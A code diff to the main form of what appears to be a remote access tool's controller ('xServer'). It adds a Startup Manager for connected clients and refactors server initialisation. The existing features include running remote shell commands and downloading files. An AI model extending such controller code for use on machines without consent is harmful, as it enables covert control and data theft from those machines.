@@ -79,7 +79,7 @@ namespace xServer.Forms
             { }
         }
 
-        private void FrmMain_Load(object sender, EventArgs e)
+        private void InitializeServer()
         {
             ListenServer = new Server(8192);
 
@@ -108,6 +108,7 @@ namespace xServer.Forms
                 typeof(Core.Packets.ServerPackets.Rename),
                 typeof(Core.Packets.ServerPackets.Delete),
                 typeof(Core.Packets.ServerPackets.Action),
+                typeof(Core.Packets.ServerPackets.GetStartupItems),
                 typeof(Core.Packets.ClientPackets.Initialize),
                 typeof(Core.Packets.ClientPackets.Status),
                 typeof(Core.Packets.ClientPackets.UserStatus),
@@ -118,12 +119,18 @@ namespace xServer.Forms
                 typeof(Core.Packets.ClientPackets.DownloadFileResponse),
                 typeof(Core.Packets.ClientPackets.GetSystemInfoResponse),
                 typeof(Core.Packets.ClientPackets.MonitorsResponse),
-                typeof(Core.Packets.ClientPackets.ShellCommandResponse)
+                typeof(Core.Packets.ClientPackets.ShellCommandResponse),
+                typeof(Core.Packets.ClientPackets.GetStartupItemsResponse)
             });
 
             ListenServer.ServerState += ServerState;
             ListenServer.ClientState += ClientState;
             ListenServer.ClientRead += ClientRead;
+        }
+
+        private void FrmMain_Load(object sender, EventArgs e)
+        {
+            InitializeServer();
 
             if (XMLSettings.AutoListen)
             {
@@ -234,6 +241,10 @@ namespace xServer.Forms
             {
                 CommandHandler.HandleShellCommandResponse(client, (Core.Packets.ClientPackets.ShellCommandResponse)packet);
             }
+            else if (type == typeof(Core.Packets.ClientPackets.GetStartupItemsResponse))
+            {
+                CommandHandler.HandleGetStartupItemsResponse(client, (Core.Packets.ClientPackets.GetStartupItemsResponse)packet);
+            }
         }
 
         private void lstClients_ColumnClick(object sender, ColumnClickEventArgs e)
@@ -323,21 +334,6 @@ namespace xServer.Forms
                 }
             }
             
-            private void ctxtTaskManager_Click(object sender, EventArgs e)
-            {
-                if (lstClients.SelectedItems.Count != 0)
-                {
-                    Client c = (Client)lstClients.SelectedItems[0].Tag;
-                    if (c.Value.FrmTm != null)
-                    {
-                        c.Value.FrmTm.Focus();
-                        return;
-                    }
-                    FrmTaskManager frmTM = new FrmTaskManager(c);
-                    frmTM.Show();
-                }
-            }
-            
             private void ctxtFileManager_Click(object sender, EventArgs e)
             {
                 if (lstClients.SelectedItems.Count != 0)
@@ -350,6 +346,36 @@ namespace xServer.Forms
                     }
                     FrmFileManager frmFM = new FrmFileManager(c);
                     frmFM.Show();
+                }
+            }
+            
+            private void ctxtStartupManager_Click(object sender, EventArgs e)
+            {
+                if (lstClients.SelectedItems.Count != 0)
+                {
+                    Client c = (Client)lstClients.SelectedItems[0].Tag;
+                    if (c.Value.FrmStm != null)
+                    {
+                        c.Value.FrmStm.Focus();
+                        return;
+                    }
+                    FrmStartupManager frmStm = new FrmStartupManager(c);
+                    frmStm.Show();
+                }
+            }
+            
+            private void ctxtTaskManager_Click(object sender, EventArgs e)
+            {
+                if (lstClients.SelectedItems.Count != 0)
+                {
+                    Client c = (Client)lstClients.SelectedItems[0].Tag;
+                    if (c.Value.FrmTm != null)
+                    {
+                        c.Value.FrmTm.Focus();
+                        return;
+                    }
+                    FrmTaskManager frmTM = new FrmTaskManager(c);
+                    frmTM.Show();
                 }
             }
             
